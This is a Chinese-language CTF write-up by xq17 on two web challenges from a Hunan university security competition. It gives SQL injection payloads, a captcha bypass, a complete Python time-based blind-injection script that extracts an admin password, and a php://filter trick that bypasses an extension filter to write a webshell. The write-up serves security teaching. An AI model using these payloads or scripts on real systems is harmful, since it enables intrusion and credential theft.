# 湖南第二届大学生网络安全技能竞赛web解题记录

阅读量 **268943**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-12-13 10:30:47

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 0x1前言

​
有幸去苟了一次湖南的第二届大学生网络安全技能竞赛，除了坐大巴去湘潭大学比较累，比赛环节的待遇还是很好哒(ps.比赛现场有好多湘大漂亮的小姐姐,辛苦哒)，感谢主办方精心准备的一次比赛。

回到比赛上来，这次我这个web dog真的太失败了,两道web最终没人A掉,这里我分享下当时自己的做题思路,加上赛后的复现记录。

## 0x2web 200

###  (一)解题记录

做题首先走一遍题目的流程:

上传 csv => next step=> 保存csv内容到数据库=>insert过程产生注入点

csv的格式很简单:

![](https://ws3.sinaimg.cn/large/006tNbRwgy1fy1pis4djaj30qy05m3z8.jpg)

在http协议里面数据就是 主要看双引号代表一个字段最优先，然后逗号分隔代表一个列

当时我通过csv的保存格式`(4,'["123","123","123","123"]','2018-12-08 12:37:24')`

猜到了是insert类型的二次注入,这里会有个过滤

‘=> \‘ 导致了单引号可以逃逸,第二行第一个字段输入

`123\' or sleep(5),123)#`
=>`(4,'["123\',123)#","123","123","123"]','2018-12-08 12:37:24')`

这样也就变成了`(4,'["123\' or sleep(5),123)` 这样理论来说就逃逸出来了

但是当时比赛的时候我本地进行测试的时候一直爆

`ERROR 1292 (22007): Truncated incorrect INTEGER value:`​

当时我也这样带入了payload然后发现save之后也没延时,就开始怀疑自己的想法了,

当时又因为这道题没人解决出来，想着自己那么菜b应该做不出来，然后放弃了。。emm(心态爆炸那种)

最后1小时主办方给了`hint:二次注入`

但是我此时已经深陷在web500中不能自拔了。

###  (二)赛后分析

首先说下我当时测试的时候插入错误的原因:

`select @[@version](https://github.com/version "@version");`

    
    
    +-----------+
    | @@version |
    +-----------+
    | 5.7.21    |
    +-----------+
    1 row in set (0.00 sec)
    

`show variables like "sql_mode";`

    
    
    STRICT_TRANS_TABLES  //严格模式
    

mysql 5.7.17 默认开启严格模式

有关严格模式可以可以参考下文章 [MySQL sql_mode 说明（及处理一起 sql_mode
引发的问题）](http://seanlook.com/2016/04/22/mysql-sql-mode-troubleshooting/)

作用:

> > `STRICT_TRANS_TABLES`  
>  设置它，表示启用严格模式。  
>  注意 `STRICT_TRANS_TABLES` 不是几种策略的组合，单独指 `INSERT`、`UPDATE`出现少值或无效值该如何处理:  
>  1.前面提到的把 ‘’ 传给int，严格模式下非法，若启用非严格模式则变成0，产生一个warning  
>  2.Out Of Range，变成插入最大边界值  
>  3.A value is missing when a new row to be inserted does not contain a value
> for a non-NULL column

经过我的测试发现了一些小特性:

我在低于mysql `5.7.17` 的`5.6.35`测试发现:

    
    
    insert into  user(`user`,`pass`) values('123"'^(sleep(5)),'123')
    

这样是可以进行插入的,而且会忽略特殊符号,提示`warning`错误

如果是高版本下的严格模式存在特殊符号是error类型错误导致没办法进行运算,这样时间盲注就失效了

但是有趣的是

    
    
    mysql> insert into test(`name`,`password`) values('"' or updatexml(1,concat(0x7e,(select user())),0),'123');
    ERROR 1105 (HY000): XPATH syntax error: '~root@localhost'
    

如果存在报错,那么在严格模式也是可以进行报错的,这个tips可以注意下。

之前看p神的一篇文章说到连接符导致insert出错的问题,用比较运算符来解决问题，我感觉还是有些问题的，

这个还需要去深入研究下。

最后，由于当时我没去测试题目的mysql版本也不知道具体是什么情况,也有可能是我做题的方向就已经出错了，

可能是另外的注入点，欢迎大佬找我交流下。

## 0x3 web500

​ 这道题是我比赛花了很长时间，最终没解出来，感觉特别遗憾的一道题，也让我反思了自己很多问题，比赛

的经验实在是匮乏，导致拖拖拉拉，卡这卡哪，最终，拖了队友的后腿，与第一名差了15分，丢失了第一。

###  (一)解题记录

当时查看题目页面源代码发现注释提示了

`<!--www.zip -->`

下载后是两个文件: `index.php` `valicode.php`

`index.php` 是主要的题目文件

`valicode.php` 是生成验证码的文件

由于代码比较长这里只分析漏洞点的代码

想要源代码我会放上我的githud [ctf_web解题记录](https://github.com/mstxq17/ctf_web)

结合代码分析下流程:

程序功能(1-68 line):

    
    
    function register($user, $pass) 
    function login($user, $pass)
    function listnote($user)
    function getnote($id, $user)
    function savenote($id, $user, $title, $content)
    function newnote($user, $title, $content) 
    function delnote($id, $user)
    

**解题流程:**

​ 通过阅读代码发现有一处备份功能可以上传shell 但是需要admin权限,通过sql注入去获取admin权限

​ 正向流程就是:

    
    
     sql注入->获取admin密码->备份上传getshell->获取flag
    

**漏洞点1 SQL盲注**

    
    
    function register($user, $pass) {
        global $conn;
        $user = '0x' . bin2hex($user);
        $pass = '0x' . bin2hex($pass);
        $result = $conn->query("select * from user where user=$user");
        $data = $result->fetch_assoc();
        if ($data) return false;
        return $conn->query("insert into user (user,pass) values ($user,$pass)");    
    }
    function login($user, $pass) {
        global $conn;
        $user = '0x' . bin2hex($user);
        $result = $conn->query("select * from user where user=$user");
        $data = $result->fetch_assoc();
        if (!$data) return false;
        if ($data['pass'] === $pass) return true;
        return false;
    }
    

前几行代码可以看出来进入sql语句的变量都做了hex编码处理

这样除了二次注入是没办法注入

结合题目的描述：`很多漏洞都是粗心引起的`

然后耐心的看完了所有功能点的代码,最终发现在

    
    
    function delnote($id, $user) {
        global $conn;
        $id = (int)$id;
        $result = $conn->query("delete from note where id=$id and user='$user'");
        return $result;
    }
    

`$user` 没有进行hex编码拼接进了sql语句,那么回溯下看下传参过程

    
    
    case 'delete':
            if (!$user) {
                header("HTTP/1.1 302 Found");
                header("Location: ?action=login");
            }
            $id = (int)$_GET['id'];
            var_dump($id);
            delnote($id, $user); //调用delnote
            header("HTTP/1.1 302 Found");
            header("Location: ?action=home");
    

继续回溯

    
    
    //69-73
    $user = $_SESSION['user'];
    $action = $_GET['action'];
    $admin = $user === 'admin';
    // $conn = mysqli_connect(DB_HOST,DB_USER,DB_PASS,DB_DATABASE) or die("connect to mysql error!");
    $conn->query("set names 'utf8'");
    

`$user` 是由`$_SESSION['user']` 决定的

继续寻找下`$_SESSION['user']`赋值

    
    
    switch ($action) {
        case 'login':
            if ($user) {
                header("HTTP/1.1 302 Found");
                header("Location: ?action=home");
            }
            elseif (isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['code'])) {
                if ($_POST['code'] != $_SESSION['answer']) echo '<div class="alert alert-danger">Math Test Failed</div>';
                elseif ($_POST['user'] == '') echo '<div class="alert alert-danger">Username Required</div>';
                elseif ($_POST['pass'] == '') echo '<div class="alert alert-danger">Password Required</div>';
                elseif (!login((string)$_POST['user'], (string)$_POST['pass'])) echo '<div class="alert alert-danger">Incorrect</div>';
                else {
                    $_SESSION['user'] = $_POST['user']; //here
                    header("HTTP/1.1 302 Found");
                    header("Location: ?action=home");
                }
                $_SESSION['answer'] = rand();
            }
            ?>
    

`$_SESSION['user'] = $_POST['user'];` 可以看到在登陆成功后把post的user值直接设置给了session

那么思路就来了

通过注册一个注入的语句的用户然后去执行delnote功能,虽然输出报错信息,但是可以通过时间盲注来注入出admin的密码

但是分析流程要注意以下几个问题:

注册是否有限制:

    
    
        case 'register':
            if ($user) {
                header("HTTP/1.1 302 Found");
                header("Location: ?action=home");
            }
            elseif (isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['code'])) {
                if ($_POST['code'] != $_SESSION['answer']) echo '<div class="alert alert-danger">Math Test Failed</div>';
                elseif ($_POST['user'] == '') echo '<div class="alert alert-danger">Username Required</div>';
                elseif ($_POST['pass'] == '') echo '<div class="alert alert-danger">Password Required</div>';
                elseif (!register((string)$_POST['user'], (string)$_POST['pass'])) echo '<div class="alert alert-danger">User Already Exists</div>';
                else echo '<div class="alert alert-success">OK</div>';
                $_SESSION['answer'] = rand();
            }
    

`$_POST['code'] != $_SESSION['answer'` 这里有个验证码判断,然后跟进去那个注册功能

上面有代码,可以发现hex编码后插入到sql语句中,并没有其他限制。

访问功能点的要求: `session['user']` 不为空

**需要解决的问题:**

​ (1)时间盲注,需要绕过注册和登录时候的验证码

​ (2)解决登陆后,保持cookie状态去请求`delnote`功能

(1)经典的验证码绕过

验证码工作流程:

    
    
    <span class="input-group-addon"><img src="valicode.php" onclick="this.src='./valicode.php?'+Math.random();"></span>
    

登陆界面通过调用`valicode.php` 然后生成验证码设置全局`$_SESSION['answer']`的值

然后在`index.php`

    
    
    elseif (isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['code'])) {
                if ($_POST['code'] != $_SESSION['answer']) echo '<div class="alert alert-danger">Math Test Failed</div>';
    

进行了判断

网上很多代码写的验证码就是这样写的,由于session是不可伪造的

安全的写法应该是要判断下`$_SESSION['answer']`是否非空,然后在进行比较

这里没有那么便会产生漏洞,$_SESSION变量是根据cookie里面的会话`sessionid`来获取的

那么只要我们删除掉cookie里面的`PHPSESSID`

然后$_POST[‘code’] 为空,那么验证码就可以绕过了。

    
    
    <?php
    session_start();
    var_dump($_SESSION);
    if($_GET['user'] === $_SESSION['user'])
    {
        var_dump($_SESSION);
        echo '666';
    }
    ?>
    

你可以本地用这个代码进行验证一下。

(2)解决保持cookie访问功能

当时我搞混了hackhttp和requests

requests是不会存储`set-cookie`的值

但是可以通过设置 `s = requests.session()`

来保持会话

(3)需要注意下一些坑点

数据库存储的名字应该是 `bin2hex(admin)`的值

当时我比赛直接用了`admin` 一直跑不出来

    
    
    -- 数据库 `ctf`
    drop database if exists ctf;
    create database ctf;
    
    -- -------------------    -- 表
    use ctf;
    create table if not exists `user`(
        `id` int auto_increment,
        `user` varchar(255) not null,
        `pass` varchar(255) not null,
        primary key(`id`)
    )ENGINE=InnoDB DEFAULT CHARSET=utf8;
    
    create table if not exists `note`(
        `id` int  auto_increment,
        `user` varchar(255) not null,
        `title` varchar(255) not null,
        `content` text,
        primary key (`id`)
    )ENGINE=InnoDB DEFAULT CHARSET=utf8;
    
    -- ----------------    -- 测试数据
    
    insert into user (user,pass) values('0x61646d696e','0x61646d696e'); -- admin admin
    insert into note (user,title,content) values('0x61646d696e','test','test');
    

这里我给出我自己结合题目构造出来的数据库,来进行复现

没有准备,现场写的垃圾脚本,惨痛经历,建议打比赛要自己准备好各类型脚本.

    
    
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    import requests
    import time
    
    str = 'abcdefghijklmnopqrstuvwxyz1234567890_'
    flag=""
    for i in range(1,40):
        for j in str:
            url = 'http://127.0.0.1:8888/ctf2/?action=register'
            payload= "admin' or if((ascii(mid((select pass from user where user='0x61646d696e'),{pos},1))={v}),sleep(5),0)#".format(pos=i,v=ord(j))
            data = {
                'user': payload,
                'pass': 'admin',
                'code':''
            }
            try:
                r1 = requests.post(url,data=data)
            except Exception as e:
                print e
            # print dir(requests.cookies)
            #login
            s = requests.session()
            url1 = 'http://127.0.0.1:8888/ctf2/?action=login'
            data1 = {
                'user':payload,
                'pass':'admin',
                'code':''
            }
            try:
                r2=s.post(url1,data=data1)
            except Exception as e:
                print e
            #getflag
            url2 = 'http://127.0.0.1:8888/ctf2/?action=delete&id=3'
            t1 = time.time()
            try:
                r3 = s.get(url2,allow_redirects=False)
            except Exception as e:
                print e
            # print r3.content
            t2 =time.time()
            if(t2-t1>3):
                flag = flag + j
                print "adminpass:{}".format(flag)
    

这个脚本也就凑合着用，如果比赛环境较卡的话，这样写的是不行的，要自己写好异常处理，出错判断等用函数封装好,方便比赛快速修改。

获取到用户名和密码 `admin admin`

####  漏洞点二 php代码注入(文件上传)

    
    
    case 'backup':
        if (!$admin) {
            header("HTTP/1.1 302 Found");
            header("Location: ?action=home");
        }
        if (!empty($_POST['id']) && !empty($_POST['file'])) {
    
            $id = (int)$_POST['id'];
            chdir("./backupnotes/");
            $file = str_replace("..","",$_POST['file']);
            if (preg_match('/.+.ph(p[3457]?|t|tml)$/', $file)) echo '<div class="alert alert-danger">Bad file extension</div>';
            else {
                $result = $conn->query("select * from note where id=$id");
                if (!$result->num_rows)  echo '<div class="alert alert-danger">Failed to backup</div>';
                else {
                    $data = $result->fetch_assoc();
                    $f = fopen($file, 'w');
                    if($f){
                            fwrite($f, $data['content']);
                            fclose($f);
                            echo '<div class="alert alert-success">Backup saved at ./backupnotes/' . $file . '</div>';
                        }else{
                            echo '<div class="alert alert-danger">Failed to backup</div>';
                        }
                }
            }
     }
    

分析下流程: 获取file和id->判断文件名->根据id获取content内容->写入文件->输出文件路径

**需要解决问题:**

（1)绕过文件名后缀判断

`if (preg_match('/.+.ph(p[3457]?|t|tml)$/', $file))`

这个正则问题出现在$ 匹配末尾 文件名 `1.php/.`,在写入的时候会除掉/.

这样就绕过去了

(2)content内容是否可控

    
    
    1.$content = htmlspecialchars($_POST['content'],ENT_QUOTES);
    2.newnote($user, $title, $content)
    3.function newnote($user, $title, $content) {
        global $conn;
        if ($title) $title = '0x' . bin2hex($title); else $title = "''";
        if ($content) $content = '0x' . bin2hex($content); else $content = "''";
        $user = '0x'.bin2hex($user);
        $result = $conn->query("insert into note (user, title, content) values ($user, $title, $content)");
        return $result;
    }
    

可以发现我们可以通过

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fy21c1dxnaj315g0l0760.jpg)

写入`<?php phpinfo();?>`

然后在url上获取id进入备份功能

当时我以为这样就ok结果 但是去查看下文件就发现了

`<> 被htmlspcialchar转义掉了`

这里便有个 **tips来绕过**

以前我们应该做过类似的绕过死亡的exit这些题目 写函数用的是`file_put_contents()`

参考下p神的文章:[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

经过我测试fwrite也是支持php://filter的

那么思路就有了

`<?php phpinfo();?>` ->base64->`PD9waHAgcGhwaW5mbygpOz8+`

然后存入note里面获取到对应的id

进入备份功能,文件名:`php://filter/write=convert.base64-decode/resource=xq17.php/.`

这样便可以实现getshell了

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fy21tov0i1j31ki0ee42v.jpg)

## 0x4比赛感受

​ 之前打完了比赛之后就比较懒惰了,搞的这次比赛没准备好脚本还有整理手头积累的一些知识点，

反正这次web打的很迷，看着雅礼中学那些高中生大佬还有湘大的漂亮小姐姐，自己就被奶死了，搞

得这次web本应做出来的题没做出来，没能苟第一，与一等奖绝缘，还是很遗憾，菜是原罪。(ps苟了个华为ai音箱奖品感觉还是很好哒)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **xq17** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/167637](/post/id/167637)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)

 **+1** __23赞

 __收藏

![](https://q.qlogo.cn/qqapp/101431079/FB5738D77CCE7E738CDE1AA49ED6757A/40)
xq17

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

